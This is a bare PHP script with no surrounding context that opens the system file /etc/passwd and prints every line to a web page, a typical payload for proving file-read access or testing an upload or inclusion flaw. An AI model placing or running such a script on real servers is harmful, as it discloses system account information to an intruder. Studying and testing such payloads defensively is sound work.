<?php
$file = fopen("/etc/passwd","r");

while(! feof($file))
  {
  echo fgets($file). "<br />";
  }

fclose($file);
?> 
